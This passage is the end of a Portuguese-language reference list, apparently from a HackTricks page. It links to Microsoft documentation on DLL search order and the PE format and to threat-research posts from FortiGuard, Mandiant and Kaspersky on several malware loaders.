- [30] [Microsoft Learn – Ordem de pesquisa de DLLs (Dynamic-link library search order)](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Formato PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Descobrindo uma variante do SectopRAT incorporada em software legítimo](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Roubando o LIGHTSHOW (Parte Um)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operação FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – Framework de carregamento .NET baseado em XAML do NetamLoader](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
